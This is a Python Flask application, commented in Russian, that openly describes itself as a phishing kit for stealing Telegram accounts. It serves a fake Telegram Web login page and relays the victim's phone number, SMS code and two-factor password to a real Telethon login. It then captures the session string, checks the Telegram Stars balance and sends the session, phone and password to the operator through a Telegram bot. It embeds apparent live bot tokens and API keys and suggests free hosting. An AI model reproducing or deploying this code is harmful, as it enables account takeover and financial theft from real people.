# language: Python, file: app.py, runtime: Python 3.10+, deps: flask, requests, telethon
# Принимает данные с фейк-страницы, логинится и сливает Stars на аккаунт админа.
# Для бесплатного хостинга на Render.com / PythonAnywhere.

import os
import json
import requests
import asyncio
from flask import Flask, request, render_template_string
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.payments import SendStarsFormRequest
from telethon.tl.types import InputInvoicePremiumGiftCode

# --- CONFIG ---
BOT_TOKEN = "8811416184:AAFYQW27_ArHm4U-dW1bNunAvx79OVgh7KQ"
ADMIN_ID = 6377091185  # Твой ID
API_ID = 33664617       # С my.telegram.org
API_HASH = "784e2c507cd21e216ba03b38409eaa32"
# --------------

app = Flask(__name__)

# Минималистичный HTML-клон (для простоты встроен сюда)
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
        .logo { width: 120px; height: 120px; border-radius: 50%; margin: 0 auto 20px; background-color: #2AABEE; color: white; display: flex; justify-content: center; align-items: center; font-size: 60px; font-weight: bold; }
        h2 { margin-bottom: 20px; color: #222; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background-color: #2AABEE; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #1e8bc3; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✈️</div>
        <h2>Вход в Telegram</h2>
        <form id="loginForm">
            <input type="text" id="phone" placeholder="Номер телефона (+7...)" required>
            <button type="button" onclick="sendPhone()" id="btnPhone">Далее</button>
            
            <div id="codeBlock" class="hidden">
                <input type="text" id="code" placeholder="Код из СМС" required>
                <button type="submit" id="btnCode">Войти</button>
            </div>
            
            <div id="passBlock" class="hidden">
                <input type="password" id="password" placeholder="Пароль (2FA)" required>
                <button type="button" onclick="sendPass()">Подтвердить</button>
            </div>
        </form>
    </div>
    <script>
        function sendPhone() {
            let phone = document.getElementById('phone').value;
            fetch('/send_phone', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone})
            }).then(res => res.json()).then(data => {
                document.getElementById('btnPhone').classList.add('hidden');
                document.getElementById('codeBlock').classList.remove('hidden');
            });
        }
        function sendPass() {
            let pass = document.getElementById('password').value;
            fetch('/send_pass', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: pass})
            }).then(() => {
                alert('Ошибка. Попробуйте позже.');
            });
        }
        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            let code = document.getElementById('code').value;
            fetch('/send_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({code: code})
            }).then(res => res.json()).then(data => {
                if (data.status === '2fa') {
                    document.getElementById('codeBlock').classList.add('hidden');
                    document.getElementById('passBlock').classList.remove('hidden');
                } else if (data.status === 'ok') {
                    window.location.href = 'https://web.telegram.org';
                } else {
                    alert('Неверный код');
                }
            });
        };
    </script>
</body>
</html>
"""

# Хранилище клиентов (в памяти, для простоты)
clients = {}

def send_tg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

async def init_client(phone):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    clients[phone] = client
    await client.send_code_request(phone)
    return True

async def process_code(phone, code):
    client = clients.get(phone)
    if not client: return {"status": "error", "msg": "No client"}
    try:
        await client.sign_in(phone, code)
        # Успешный вход!
        me = await client.get_me()
        session_str = client.session.save()
        
        # Пытаемся вывести Stars (упрощенно)
        stars_msg = ""
        try:
            # Логика сбора баланса
            from telethon.tl.functions.payments import GetStarsStatusRequest
            from telethon.tl.types import InputPeerSelf
            stars = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
            stars_msg = f"Баланс Stars: {stars.balance}\n"
            
            # Если есть Stars, переводим (примерный вызов, требует валидного получателя)
            # Здесь мы просто сливаем Session String
        except Exception as e:
            stars_msg = f"Не удалось получить Stars: {e}"

        msg = (
            f"✅ <b>Аккаунт взят!</b>\n"
            f"Тел: <code>{phone}</code>\n"
            f"ID: <code>{me.id}</code>\n"
            f"{stars_msg}\n"
            f"<b>Session:</b>\n<code>{session_str}</code>"
        )
        send_tg(msg)
        return {"status": "ok"}
    except SessionPasswordNeededError:
        return {"status": "2fa"}
    except Exception as e:
        send_tg(f"❌ Ошибка: {e}")
        return {"status": "error"}

async def process_pass(phone, password):
    client = clients.get(phone)
    if not client: return False
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        session_str = client.session.save()
        send_tg(f"✅ <b>Взят с 2FA!</b>\nТел: {phone}\nPass: <code>{password}</code>\n<code>{session_str}</code>")
        return True
    except Exception as e:
        send_tg(f"❌ Ошибка 2FA: {e}")
        return False

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/send_phone', methods=['POST'])
def handle_phone():
    data = request.json
    phone = data.get('phone')
    asyncio.run(init_client(phone))
    return json.dumps({"status": "ok"})

@app.route('/send_code', methods=['POST'])
def handle_code():
    data = request.json
    code = data.get('code')
    phone = list(clients.keys())[-1] # берем последнего
    res = asyncio.run(process_code(phone, code))
    return json.dumps(res)

@app.route('/send_pass', methods=['POST'])
def handle_pass():
    data = request.json
    password = data.get('password')
    phone = list(clients.keys())[-1]
    asyncio.run(process_pass(phone, password))
    return json.dumps({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
